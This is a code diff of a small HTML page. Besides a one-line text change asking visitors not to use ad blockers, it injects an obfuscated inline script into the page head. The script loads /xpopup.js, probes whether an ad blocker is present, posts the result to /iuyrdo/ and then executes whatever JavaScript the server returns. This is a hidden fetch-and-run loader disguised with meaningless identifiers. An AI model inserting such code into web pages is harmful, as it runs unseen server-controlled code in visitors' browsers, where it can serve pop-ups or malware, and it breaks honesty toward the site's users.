@@ -37,6 +37,7 @@ function move() {
 <link href="style.css" rel="stylesheet" type="text/css" />
   <link rel="icon" type="image/x-icon" href="/uploads/favicon.ico">
 <script src="https://www.w3schools.com/lib/w3.js"></script>
+<script>(function(){var rdO;function oZD(callback){var e=document.createElement('script');e.src='/xpopup.js';e.async=1;e.onerror=callback;e.onload=callback;var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(e,s);}function wLe(){rdO=document.getElementById('freiregrubfgzy')?0:1;var r=new XMLHttpRequest();r.open('POST','/iuyrdo/');r.setRequestHeader('Content-type','application/x-www-form-urlencoded');r.onreadystatechange=function(){if(r.readyState==4 && r.status==200){if(!!r.responseText){var e=document.createElement('script');e.innerHTML=r.responseText;document.body.appendChild(e);}}};r.send('iuy='+rdO);}oZD(wLe);})();</script>
 </head>
 <body>
 <div class="w3-container w3-display-container w3-card w3-panel" style="width:200px;">
@@ -66,7 +67,7 @@ function move() {
 </p>
 </div>
 <div class="w3-container w3-display-container w3-card w3-panel">
-<p class="bi bi-browser-chrome">Tested in chrome and edge desktop and chrome, duckduckgo, and opera mobile.</p>
+<p class="bi bi-browser-chrome">Tested in chrome and edge desktop and chrome, duckduckgo, and opera mobile. No adblock please.</p>
 <button onclick="window.location.href='/uploads.php';" class="bi bi-cloud w3-bar-item w3-btn">Code and Uploads</button>
 <br>
 </div>
